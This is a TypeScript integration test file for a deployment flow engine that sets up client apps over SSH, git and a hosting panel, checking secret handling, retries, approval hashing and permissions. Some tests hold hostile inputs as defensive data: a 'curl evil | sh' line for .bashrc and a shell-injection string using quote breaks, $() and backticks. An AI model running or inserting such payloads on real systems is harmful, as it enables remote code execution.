import { execFileSync } from 'node:child_process';
import { existsSync, readdirSync, readFileSync, rmSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { and, eq } from 'drizzle-orm';
import { afterAll, afterEach, beforeAll, describe, expect, it } from 'vitest';
import { db, pg } from '../../../db/client';
import { auditLog, connections, deployments, playbookRuns, playbookSteps } from '../../../db/schema';
import { makeOrg } from '../../ai/__tests__/support';
import { sealVerificationForTest } from '../../connections/github-verify';
import { createConnection } from '../../connections/service';
import { DomainError } from '../../errors';
import { createClient } from '../../portfolio/clients';
import { createProduct } from '../../portfolio/products';
import { definitionSchema, type Definition } from '../definition';
import { executeRun, RunBusy } from '../engine';
import { cancelRun, createFlow, getRun, planRun, retryRun, startRun, updateFlow } from '../service';
import { startWorld, type World } from './harness';

afterAll(async () => {
  await pg.end();
});

let world: World;
beforeAll(async () => {
  world = await startWorld({ listening: [6013] });
});
afterEach(() => {
  for (const f of readdirSync(world.root)) rmSync(join(world.root, f), { recursive: true, force: true }); // every test starts on an empty server
  world.panel.databases.splice(1);
  world.panel.proxies.splice(1);
  world.panel.hits.length = 0;
  world.execCommands.length = 0;
});
afterAll(() => world.close());

const code = async (p: Promise<unknown>) => ((await p.then(() => null, (e: unknown) => e)) as DomainError | null)?.code;

async function setup() {
  const o = await makeOrg();
  const product = await createProduct(o.ownerCtx, { name: 'Invly' });
  const client = await createClient(o.ownerCtx, { name: 'Butik Kebaya' });
  const id = Math.floor(Math.random() * 1e9) + 1;
  const gh = await createConnection(o.ownerCtx, { kind: 'github', installationId: id, verification: sealVerificationForTest(o.ownerCtx, [{ id, account: 'asiifdev' }]) });
  const srv = await createConnection(o.ownerCtx, { kind: 'ssh', name: 'Server', host: '8.8.8.8', username: 'deploy', authMethod: 'password', password: 'x-password-123' });
  const panel = await createConnection(o.ownerCtx, { kind: 'aapanel', name: 'Panel', url: 'https://8.8.4.4:7800', apiKey: 'abcdefgh12345678' });
  for (const c of [gh, srv, panel]) await db.update(connections).set({ testStatus: 'ok', hostKeyFingerprint: c.id === srv.id ? 'SHA256:test' : null }).where(eq(connections.id, c.id));
  return { o, product, client, bindings: { server: srv.id, panel: panel.id, github: gh.id } };
}

const dir = '{{params.folder_root}}/{{params.domain}}';
const server = { ssh: 'server' };
function miniFlow(extra: Partial<Definition> = {}): Definition {
  const nodes = [
    { id: 'check', tool: 'ssh.check_tools', bind: server, config: { require: 'php,composer,node,npm,pm2,git' } },
    { id: 'ports_srv', tool: 'ssh.list_ports', bind: server, config: { from: 6000, to: 6999 } },
    { id: 'ports_panel', tool: 'panel.list_proxies', bind: { aapanel: 'panel' }, config: {} },
    { id: 'port', tool: 'orbyte.allocate_port', config: { from: 6000, to: 6999, used: '{{nodes.ports_srv.ports}},{{nodes.ports_panel.ports}}' } },
    { id: 'db_pw', tool: 'orbyte.generate_secret', config: { name: 'db_password', length: 24 } },
    { id: 'db', tool: 'panel.create_database', bind: { aapanel: 'panel' }, config: { name: '{{params.db_name}}', password: '{{secrets.db_password}}' } },
    { id: 'clone', tool: 'ssh.git_clone', bind: { ssh: 'server', github: 'github' }, config: { repo: 'acme/app', branch: '{{params.branch}}', dir } },
    { id: 'env', tool: 'ssh.env_set', bind: server, config: { dir, entries: 'APP_NAME={{params.slug}}\nAPP_ENV=production\nAPP_DEBUG=false\nDB_CONNECTION=mysql\nDB_DATABASE={{params.db_name}}\nDB_PASSWORD={{secrets.db_password}}\nREVERB_SERVER_PORT={{nodes.port.port}}' } },
    { id: 'composer', tool: 'ssh.composer_install', bind: server, config: { dir } },
    { id: 'prepare', tool: 'ssh.prepare_folders', bind: server, config: { dir, create: 'storage/backups', writable: 'storage' } },
    { id: 'key', tool: 'ssh.artisan', bind: server, config: { dir, command: 'key_generate' } },
    { id: 'proxy', tool: 'panel.create_proxy', bind: { aapanel: 'panel' }, config: { domain: 'ws-{{params.domain}}', target: 'http://127.0.0.1:{{nodes.port.port}}' } },
    { id: 'pm2', tool: 'ssh.pm2', bind: server, config: { dir, action: 'start' } },
    { id: 'record', tool: 'orbyte.record_deployment', config: { client_id: '{{params.client_id}}', product_id: '{{params.product_id}}', domain: '{{params.domain}}', repo: 'acme/app', branch: '{{params.branch}}', app_path: dir, app_port: '{{nodes.port.port}}', commit: '{{nodes.clone.commit}}', server_slot: 'server' } },
  ];
  return definitionSchema.parse({
    slots: [{ name: 'server', kind: 'ssh' }, { name: 'panel', kind: 'aapanel' }, { name: 'github', kind: 'github' }],
    params: [{ name: 'client_id' }, { name: 'product_id' }, { name: 'slug', pattern: 'slug' }, { name: 'domain', pattern: 'domain' }, { name: 'branch', pattern: 'branch' }, { name: 'db_name', pattern: 'identifier' }, { name: 'folder_root', pattern: 'path' }],
    nodes,
    edges: nodes.slice(1).map((n, i) => ({ from: nodes[i].id, to: n.id })),
    ...extra,
  });
}
const params = (clientId: string, over: Record<string, unknown> = {}) => ({ client_id: clientId, slug: 'butik-kebaya', domain: 'butik.example.com', branch: 'main', db_name: 'butik_kebaya', folder_root: world.root, ...over });

async function planned(s: Awaited<ReturnType<typeof setup>>, def = miniFlow(), over: Record<string, unknown> = {}) {
  const { id } = await createFlow(s.o.ownerCtx, { name: `Flow ${Math.random()}`, kind: 'setup', definition: def });
  const plan = await planRun(s.o.ownerCtx, { flowId: id, productId: s.product.id, params: params(s.client.id, over), bindings: s.bindings });
  return { flowId: id, plan };
}
const stepRows = (runId: string) => db.select().from(playbookSteps).where(eq(playbookSteps.runId, runId)).orderBy(playbookSteps.position);
const runRow = async (runId: string) => (await db.select().from(playbookRuns).where(eq(playbookRuns.id, runId)))[0];

describe('flow engine against a real SSH server, real git, and a panel look-alike', () => {
  it('runs a whole client setup, and leaves the server and Orbyte as the flow says', async () => {
    const s = await setup();
    const { plan } = await planned(s);
    expect(plan.changes.map((c) => c.tool)).toEqual(['panel.create_database', 'ssh.git_clone', 'ssh.env_set', 'ssh.composer_install', 'ssh.prepare_folders', 'ssh.artisan', 'panel.create_proxy', 'ssh.pm2', 'orbyte.record_deployment']);
    expect(await runRow(plan.runId).then((r) => r.status)).toBe('awaiting_approval');
    await startRun(s.o.ownerCtx, plan.runId, plan.planHash);
    expect(await executeRun(plan.runId, world.services)).toBe('done');

    const steps = await stepRows(plan.runId);
    expect(steps.every((x) => x.status === 'done')).toBe(true);
    // The port: highest taken in 6000-6999 (server 6013, panel proxy 6012) plus one.
    expect(steps.find((x) => x.stepKey === 'port')!.outputs).toEqual({ port: 6014 });

    const app = join(world.root, 'butik.example.com');
    expect(existsSync(join(app, '.git'))).toBe(true);
    expect(execFileSync('git', ['-C', app, 'remote', 'get-url', 'origin']).toString().trim()).toBe(`file://${world.remotes}/acme/app.git`);
    const env = readFileSync(join(app, '.env'), 'utf8');
    expect(env).toContain('APP_NAME=butik-kebaya');
    expect(env).toContain('APP_ENV=production'); // replaced from .env.example (was local)
    expect(env).toContain('DB_CONNECTION=mysql');
    expect(env).toContain('QUEUE_CONNECTION=database'); // untouched key of the example is kept
    expect(env).toContain('REVERB_SERVER_PORT=6014'); // new key appended
    expect(statSync(join(app, '.env')).mode & 0o777).toBe(0o600);
    expect(existsSync(join(app, 'storage', 'backups'))).toBe(true);
    expect(world.calls()).toEqual(expect.arrayContaining([expect.stringMatching(/^composer install --no-dev/), 'php artisan key:generate --force', 'pm2 start ecosystem.config.cjs']));

    expect(world.panel.databases.map((d) => d.name)).toEqual(['existing_db', 'butik_kebaya']); // the one that was there is untouched
    expect(world.panel.proxies.find((p) => p.name === 'ws-butik.example.com')?.proxy_pass).toBe('http://127.0.0.1:6014');

    const [dep] = await db.select().from(deployments).where(and(eq(deployments.orgId, s.o.ownerCtx.orgId), eq(deployments.clientId, s.client.id)));
    expect(dep).toMatchObject({ domain: 'butik.example.com', repo: 'acme/app', branch: 'main', appPort: 6014, behindBy: 0, appPath: app });
    expect(dep.deployedCommit).toMatch(/^[0-9a-f]{40}$/);

    // Secrets: gone from the run when it ended, and nowhere in anything that is kept or shown.
    expect((await runRow(plan.runId)).secretsCiphertext).toBeNull();
    const pw = /^DB_PASSWORD=(.+)$/m.exec(env)![1];
    expect(pw.length).toBe(24);
    const everything = JSON.stringify([steps, await runRow(plan.runId), await getRun(s.o.ownerCtx, plan.runId), await db.select().from(auditLog).where(eq(auditLog.orgId, s.o.ownerCtx.orgId)), world.panel.hits]);
    expect(everything).not.toContain(pw);
    expect(everything).not.toContain('ghs_faketoken_for_tests');
    // ...and never on a command line: every command the server saw is the same fixed shell prelude (the scripts came on stdin).
    expect(new Set(world.execCommands).size).toBe(1);
    expect(world.execCommands[0]).not.toContain(pw);
  });

  it('pauses on a failed node, keeps what finished, and carries on from that node without repeating anything', async () => {
    const s = await setup();
    const { plan } = await planned(s);
    await startRun(s.o.ownerCtx, plan.runId);
    world.failOnce('composer');
    expect(await executeRun(plan.runId, world.services)).toBe('paused');
    let steps = await stepRows(plan.runId);
    expect(steps.filter((x) => x.status === 'done').map((x) => x.stepKey)).toEqual(['check', 'ports_srv', 'ports_panel', 'port', 'db_pw', 'db', 'clone', 'env']);
    expect(steps.find((x) => x.stepKey === 'composer')).toMatchObject({ status: 'failed', attempts: 1 });
    expect(steps.find((x) => x.stepKey === 'composer')!.error).toContain('code 1');
    expect(steps.find((x) => x.stepKey === 'composer')!.output).toContain('composer exploded');
    const paused = await runRow(plan.runId);
    expect(paused.status).toBe('paused');
    expect(paused.secretsCiphertext).not.toBeNull(); // kept so the run can go on
    const createsBefore = world.panel.hits.filter((h) => h.includes('AddDatabase')).length;

    await retryRun(s.o.ownerCtx, plan.runId);
    expect(await executeRun(plan.runId, world.services)).toBe('done');
    steps = await stepRows(plan.runId);
    expect(steps.every((x) => x.status === 'done')).toBe(true);
    expect(steps.find((x) => x.stepKey === 'composer')!.attempts).toBe(2);
    expect(steps.find((x) => x.stepKey === 'db')!.attempts).toBe(1); // not repeated
    expect(world.panel.hits.filter((h) => h.includes('AddDatabase')).length).toBe(createsBefore);
    expect(world.panel.databases.filter((d) => d.name === 'butik_kebaya')).toHaveLength(1);
    // The password made before the pause is the one that went into .env after it: the secrets survived.
    const env = readFileSync(join(world.root, 'butik.example.com', '.env'), 'utf8');
    expect(/^DB_PASSWORD=(.+)$/m.exec(env)![1]).toHaveLength(24);
    expect((await runRow(plan.runId)).secretsCiphertext).toBeNull();
  });

  it('a node that was `running` when the process died is simply run again, the finished ones are not', async () => {
    const s = await setup();
    const { plan } = await planned(s);
    await startRun(s.o.ownerCtx, plan.runId);
    world.failOnce('composer');
    await executeRun(plan.runId, world.services);
    await db.update(playbookSteps).set({ status: 'running' }).where(and(eq(playbookSteps.runId, plan.runId), eq(playbookSteps.stepKey, 'composer'))); // as if the process was killed mid-node
    await db.update(playbookRuns).set({ status: 'running' }).where(eq(playbookRuns.id, plan.runId));
    expect(await executeRun(plan.runId, world.services)).toBe('done');
    expect(world.panel.databases.filter((d) => d.name === 'butik_kebaya')).toHaveLength(1);
  });

  it('a variable that cannot be filled in, or a setting that is not valid, fails that node with a clear reason and no values', async () => {
    const s = await setup();
    const def = miniFlow();
    def.nodes.find((n) => n.id === 'clone')!.config.dir = 'relative/path'; // not an absolute path
    const { plan } = await planned(s, def);
    await startRun(s.o.ownerCtx, plan.runId);
    expect(await executeRun(plan.runId, world.services)).toBe('paused');
    const failed = (await stepRows(plan.runId)).find((x) => x.status === 'failed')!;
    expect(failed.stepKey).toBe('clone');
    expect(failed.error).toMatch(/not valid \(dir:/);
    expect(failed.error).not.toContain('relative/path');
  });

  it('cancelling stops the run for good and wipes the secrets; nothing can start it again', async () => {
    const s = await setup();
    const { plan } = await planned(s);
    await startRun(s.o.ownerCtx, plan.runId);
    world.failOnce('composer');
    await executeRun(plan.runId, world.services);
    expect((await runRow(plan.runId)).secretsCiphertext).not.toBeNull();
    await cancelRun(s.o.ownerCtx, plan.runId);
    const row = await runRow(plan.runId);
    expect(row).toMatchObject({ status: 'cancelled', secretsCiphertext: null, secretsKeyVersion: null });
    expect(await code(retryRun(s.o.ownerCtx, plan.runId))).toBe('invalid_state');
    expect(await code(startRun(s.o.ownerCtx, plan.runId))).toBe('invalid_state');
    expect(await executeRun(plan.runId, world.services)).toBe('skipped');
  });

  it('two workers cannot run the same run at once, and one run per server at a time', async () => {
    const s = await setup();
    const a = await planned(s);
    await startRun(s.o.ownerCtx, a.plan.runId);
    const b = await planned(s, undefined, { slug: 'other', domain: 'other.example.com', db_name: 'other_db' });
    await startRun(s.o.ownerCtx, b.plan.runId);
    const results = await Promise.allSettled([executeRun(a.plan.runId, world.services), executeRun(a.plan.runId, world.services)]);
    expect(results.filter((r) => r.status === 'rejected' && r.reason instanceof RunBusy)).toHaveLength(1);
    expect(results.filter((r) => r.status === 'fulfilled')).toHaveLength(1);
    // The same server is now free again, so the second run goes through.
    expect(await executeRun(b.plan.runId, world.services)).toBe('done');
  });

  it('the plan cannot be changed after it was proposed: the hash is worked out again before it starts', async () => {
    const s = await setup();
    const { plan } = await planned(s);
    await db.update(playbookRuns).set({ params: { ...(await runRow(plan.runId)).params, domain: 'evil.example.com' } }).where(eq(playbookRuns.id, plan.runId));
    expect(await code(startRun(s.o.ownerCtx, plan.runId, plan.planHash))).toBe('invalid_state');
    const s2 = await setup();
    const p2 = await planned(s2);
    expect(await code(startRun(s2.o.ownerCtx, p2.plan.runId, 'f'.repeat(64)))).toBe('invalid_state');
  });

  it('a run keeps the flow version it was approved with, even when the flow is edited afterwards', async () => {
    const s = await setup();
    const { flowId, plan } = await planned(s);
    const edited = miniFlow();
    edited.nodes.find((n) => n.id === 'env')!.config.entries = 'APP_NAME=changed-after-approval';
    expect((await updateFlow(s.o.ownerCtx, flowId, { definition: edited })).version).toBe(2);
    await startRun(s.o.ownerCtx, plan.runId, plan.planHash);
    expect(await executeRun(plan.runId, world.services)).toBe('done');
    expect(readFileSync(join(world.root, 'butik.example.com', '.env'), 'utf8')).toContain('APP_NAME=butik-kebaya');
    expect((await getRun(s.o.ownerCtx, plan.runId)).flowVersion).toBe(1);
  });

  it('refuses to plan with a connection that has not passed its test, with the wrong kind, or with a missing one', async () => {
    const s = await setup();
    const { id } = await createFlow(s.o.ownerCtx, { name: 'Flow X', kind: 'setup', definition: miniFlow() });
    const plan = (b: Record<string, string>) => planRun(s.o.ownerCtx, { flowId: id, productId: s.product.id, params: params(s.client.id), bindings: b });
    expect(await code(plan({ server: s.bindings.server, panel: s.bindings.panel }))).toBe('validation'); // github slot missing
    expect(await code(plan({ ...s.bindings, panel: s.bindings.github }))).toBe('validation'); // wrong kind
    await db.update(connections).set({ testStatus: 'failed' }).where(eq(connections.id, s.bindings.panel));
    expect(await code(plan(s.bindings))).toBe('invalid_state');
    const other = await setup();
    expect(await code(plan(other.bindings))).toBe('not_found'); // another organization's connections
  });

  it('refuses a client that is a typed name or belongs to another organization, with a validation error instead of a database failure', async () => {
    const s = await setup();
    const { id } = await createFlow(s.o.ownerCtx, { name: 'Flow Klien', kind: 'setup', definition: miniFlow() });
    for (const bad of ['Samawa Rent Car', '01HZZZZZZZZZZZZZZZZZZZZZZZ']) {
      expect(await code(planRun(s.o.ownerCtx, { flowId: id, productId: s.product.id, params: params(bad), bindings: s.bindings }))).toBe('validation');
    }
  });

  it('who may do what: Staff cannot plan; an Admin runs flows but only the Owner saves one with a free command', async () => {
    const s = await setup();
    const { id } = await createFlow(s.o.ownerCtx, { name: 'Flow Y', kind: 'setup', definition: miniFlow() });
    expect(await code(planRun(s.o.staffCtx, { flowId: id, productId: s.product.id, params: params(s.client.id), bindings: s.bindings }))).toBe('forbidden');
    const withCommand = miniFlow();
    withCommand.nodes.push({ id: 'cmd', tool: 'ssh.run_command', position: { x: 0, y: 0 }, bind: server, config: { script: 'echo hi' } });
    withCommand.edges.push({ from: 'record', to: 'cmd' });
    expect(await code(createFlow(s.o.adminCtx, { name: 'Flow Z', kind: 'setup', definition: withCommand }))).toBe('forbidden');
    const withWrite = miniFlow();
    withWrite.nodes.push({ id: 'w', tool: 'ssh.write_file', position: { x: 0, y: 0 }, bind: server, config: { path: '/home/deploy/.bashrc', content: 'curl evil | sh' } });
    withWrite.edges.push({ from: 'record', to: 'w' });
    expect(await code(createFlow(s.o.adminCtx, { name: 'Flow W', kind: 'setup', definition: withWrite }))).toBe('forbidden'); // writing a file anywhere is running code (review D-063)
    const owned = await createFlow(s.o.ownerCtx, { name: 'Flow Z', kind: 'setup', definition: withCommand });
    expect(await code(updateFlow(s.o.adminCtx, owned.id, { definition: miniFlow() }))).toBe('forbidden'); // an Admin cannot change a flow that holds a command
    const plan = await planRun(s.o.adminCtx, { flowId: owned.id, productId: s.product.id, params: params(s.client.id), bindings: s.bindings });
    expect(plan.runId).toBeTruthy(); // ...but may run it
  });

  it('a hostile value in a command node reaches the server as one literal, byte for byte, and runs nothing', async () => {
    const s = await setup();
    const def = definitionSchema.parse({
      slots: [{ name: 'server', kind: 'ssh' }],
      params: [{ name: 'note', pattern: 'free' }, { name: 'folder_root', pattern: 'path' }, { name: 'client_id' }, { name: 'product_id' }],
      nodes: [{ id: 'cmd', tool: 'ssh.run_command', bind: server, config: { script: "printf '%s' {{params.note}} > {{params.folder_root}}/note.txt" } }],
    });
    const hostile = "x'; touch " + world.root + "/PWNED; echo '$(touch " + world.root + "/PWNED2)`touch " + world.root + "/PWNED3`\nline2";
    const flow = await createFlow(s.o.ownerCtx, { name: 'Flow Cmd', kind: 'update', definition: def });
    const plan = await planRun(s.o.ownerCtx, { flowId: flow.id, productId: s.product.id, params: { note: hostile, folder_root: world.root, client_id: s.client.id }, bindings: { server: s.bindings.server } });
    await startRun(s.o.ownerCtx, plan.runId);
    expect(await executeRun(plan.runId, world.services)).toBe('done');
    expect(readFileSync(join(world.root, 'note.txt'), 'utf8')).toBe(hostile);
    for (const f of ['PWNED', 'PWNED2', 'PWNED3']) expect(existsSync(join(world.root, f))).toBe(false);
  });

  it('a delete node removes only what an earlier node of THIS run created, never what was already there', async () => {
    const s = await setup();
    const def = definitionSchema.parse({
      slots: [{ name: 'panel', kind: 'aapanel' }],
      params: [{ name: 'db_name', pattern: 'identifier' }, { name: 'client_id' }, { name: 'product_id' }],
      nodes: [
        { id: 'pw', tool: 'orbyte.generate_secret', config: { name: 'pw', length: 20 } },
        { id: 'make', tool: 'panel.create_database', bind: { aapanel: 'panel' }, config: { name: '{{params.db_name}}', password: '{{secrets.pw}}' } },
        { id: 'undo', tool: 'panel.delete_database', bind: { aapanel: 'panel' }, config: { from: 'make' } },
      ],
      edges: [{ from: 'pw', to: 'make' }, { from: 'make', to: 'undo' }],
    });
    const flow = await createFlow(s.o.ownerCtx, { name: 'Flow Undo', kind: 'update', definition: def });
    const plan = await planRun(s.o.ownerCtx, { flowId: flow.id, productId: s.product.id, params: { db_name: 'scratch_db', client_id: s.client.id }, bindings: { panel: s.bindings.panel } });
    await startRun(s.o.ownerCtx, plan.runId);
    expect(await executeRun(plan.runId, world.services)).toBe('done');
    expect(world.panel.databases.map((d) => d.name)).toEqual(['existing_db']); // scratch_db made and removed; existing_db untouched
    // Asking for the name of a database that already exists fails instead of adopting it.
    const clash = await planRun(s.o.ownerCtx, { flowId: flow.id, productId: s.product.id, params: { db_name: 'existing_db', client_id: s.client.id }, bindings: { panel: s.bindings.panel } });
    await startRun(s.o.ownerCtx, clash.runId);
    expect(await executeRun(clash.runId, world.services)).toBe('paused');
    expect((await stepRows(clash.runId)).find((x) => x.status === 'failed')!.error).toContain('already exists');
    expect(world.panel.databases.map((d) => d.name)).toEqual(['existing_db']);
  });
});
